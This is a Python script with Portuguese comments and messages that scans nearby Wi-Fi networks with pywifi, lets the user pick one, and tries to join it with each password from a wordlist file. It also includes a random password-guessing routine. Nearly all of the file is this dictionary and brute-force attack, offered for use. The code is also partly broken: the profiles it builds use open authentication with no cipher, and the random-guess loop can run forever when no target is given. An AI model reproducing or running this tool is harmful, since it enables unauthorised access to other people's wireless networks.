import pywifi
import time
from pywifi import const
import random
import os
import string

def gerar_senha_aleatoria(tamanho, caracteres):
    return ''.join(random.choice(caracteres) for _ in range(int(tamanho)))

def encontrar_senha(caracteres, descricao_metodo, senha_alvo):
    tempo_inicial = time.time()
    senha = ''
    while senha != senha_alvo:
        senha = gerar_senha_aleatoria(len(senha_alvo), caracteres)
        tempo_decorrido = time.time() - tempo_inicial
        print(f"Procurando Senha\nTentativa: {senha}\nTempo decorrido: {tempo_decorrido:.2f} segundos", end='\r')
        os.system('cls' if os.name == 'nt' else 'clear')
        
        if senha == senha_alvo:
            break  # Para a busca quando a senha alvo for encontrada
    return senha

def testar_senha(ssid, senha_digitada=None):
    if senha_digitada:
        senha_alvo = senha_digitada
    else:
        senha_alvo = None

    senhas_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "senhas.txt")
    if os.path.isfile(senhas_file_path):
        with open(senhas_file_path, "r", encoding="utf-8") as file:
            possible_passwords = file.read().split()
            print(possible_passwords)
        
        for senha in possible_passwords:
            senha = senha.strip()
            if senha_alvo == senha:
                print(f"A senha é: {senha}")
                return

    print("Senha não encontrada no arquivo. Tentando gerar senhas...")
    time.sleep(2)
    
    numeros = [str(i) for i in range(10)]
    alfabeto_maiusculo = [chr(i) for i in range(65, 91)] 
    alfabeto_minusculo = [chr(i) for i in range(97, 123)] 
    caracteres_especiais = ['!', '@', '#', '$', '%', '&']

    # Ordem de tentativas
    ordem_tentativas = [
        (numeros, "números e letras"),
        (numeros + list(string.ascii_letters), "números e letras"),
        (numeros + alfabeto_maiusculo + alfabeto_minusculo, "números, letras e números maiúsculos/minúsculos"),
        (list(string.punctuation), "caracteres especiais"),
        (numeros + list(string.ascii_letters) + list(string.punctuation), "números, letras e caracteres especiais")
    ]

    senha_encontrada = None

    for caracteres, descricao_metodo in ordem_tentativas:
        tempo_inicial = time.time()  # Inicializa o tempo no início de cada tentativa
        senha_teste = encontrar_senha(caracteres, descricao_metodo, senha_alvo)
        tempo_decorrido = time.time() - tempo_inicial  # Calcula o tempo decorrido para a tentativa
        
        if senha_alvo and senha_teste == senha_alvo:
            senha_encontrada = senha_teste
            print(f"A senha é: {senha_encontrada}\nTempo decorrido: {tempo_decorrido:.2f} segundos")
            break

        # Conectar à rede
        wifi = pywifi.PyWiFi()
        interfaces = wifi.interfaces()
        if not interfaces:
            print("Nenhuma interface Wi-Fi encontrada.")
            return
        iface = interfaces[0]
        perfil = pywifi.Profile()
        perfil.ssid = ssid
        perfil.auth = const.AUTH_ALG_OPEN
        perfil.akm.append(const.AKM_TYPE_NONE)
        perfil.cipher = const.CIPHER_TYPE_NONE
        perfil.key = senha_teste
        iface.remove_all_network_profiles()
        perfil_temporario = iface.add_network_profile(perfil)
        iface.connect(perfil_temporario)

        while True:
            time.sleep(2)
            if iface.status() == const.IFACE_CONNECTED:
                tempo_decorrido_busca = time.time() - tempo_inicial
                print(f"Conectado à rede {ssid} com a senha: {senha_teste}")
                print(f"Tempo total de busca: {tempo_decorrido_busca:.2f} segundos")
                senha_encontrada = senha_teste
                break
            elif iface.status() == const.IFACE_DISCONNECTED:
                print(f"Falha na tentativa com a senha: {senha_teste}")
                break  # Passar para a próxima tentativa

        if senha_encontrada:
            break

    if senha_encontrada:
        return

    print(f"Senha não encontrada. Tempo decorrido: {tempo_decorrido:.2f} segundos")  # Mostra

def listar_redes_disponiveis():
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()

    if not interfaces:
        print("Nenhuma interface Wi-Fi encontrada.")
        return None

    iface = interfaces[0]

    iface.scan()
    time.sleep(2)

    redes = iface.scan_results()

    if not redes:
        print("Nenhuma rede Wi-Fi encontrada.")
        return None

    print("Redes Wi-Fi disponíveis:")
    for i, rede in enumerate(redes):
        print(f"{i+1}: {rede.ssid}")

    escolha = input("Digite o número da rede que deseja testar (ou 'q' para sair): ")

    if escolha.lower() == 'q':
        return None

    try:
        escolha = int(escolha)
        if 1 <= escolha <= len(redes):
            return redes[escolha - 1].ssid
        else:
            print("Escolha inválida. Por favor, digite um número válido.")
            return None
    except ValueError:
        print("Escolha inválida. Por favor, digite um número válido.")
        return None

def procurar_senha_para_rede(rede_selecionada):
    if not rede_selecionada:
        print("Nenhuma rede selecionada.")
        return

    wordlist_path = "senhas.txt"
    senha_encontrada = None
    tempo_inicial_busca = time.time()

    if os.path.isfile(wordlist_path):
        with open(wordlist_path, "r", encoding="utf-8") as arquivo:
            senhas_possiveis = arquivo.read().split()
            for senha_alvo in senhas_possiveis:
                senha_alvo = senha_alvo.strip()
                print(f"Tentando a senha: {senha_alvo}")

                # Conectar à rede
                wifi = pywifi.PyWiFi()
                interfaces = wifi.interfaces()
                if not interfaces:
                    print("Nenhuma interface Wi-Fi encontrada.")
                    return
                iface = interfaces[0]
                perfil = pywifi.Profile()
                perfil.ssid = rede_selecionada
                perfil.auth = const.AUTH_ALG_OPEN
                perfil.akm.append(const.AKM_TYPE_NONE)
                perfil.cipher = const.CIPHER_TYPE_NONE
                perfil.key = senha_alvo
                iface.remove_all_network_profiles()
                perfil_temporario = iface.add_network_profile(perfil)
                iface.connect(perfil_temporario)

                while True:
                    time.sleep(2)
                    if iface.status() == const.IFACE_CONNECTED:
                        tempo_decorrido_busca = time.time() - tempo_inicial_busca
                        print(f"Conectado à rede {rede_selecionada} com a senha: {senha_alvo}")
                        print(f"Tempo total de busca: {tempo_decorrido_busca:.2f} segundos")
                        senha_encontrada = senha_alvo
                        break
                    elif iface.status() == const.IFACE_DISCONNECTED:
                        print(f"Falha na tentativa com a senha: {senha_alvo}")
                        break  # Passar para a próxima tentativa

                if senha_encontrada:
                    break

            if senha_encontrada:
                print("Login bem-sucedido!")
            else:
                print("Todas as senhas testadas, nenhuma conexão bem-sucedida.")
    else:
        print("Nenhuma rede Wi-Fi encontrada.")

print("Escolha uma opção:")
print("1. Procurar redes Wi-Fi e testar senhas")
print("2. Testar o gerador de senhas")

opcao = input("Digite o número da opção desejada: ")

if opcao == '1':
    rede_selecionada = listar_redes_disponiveis()
    if rede_selecionada:
        print(f"Iniciando a busca de senha para a rede: {rede_selecionada}")
        procurar_senha_para_rede(rede_selecionada)
elif opcao == '2':
    senha_digitada = input("Digite uma senha para testar: ")
    testar_senha(None, senha_digitada)
else:
    print("Opção inválida.")
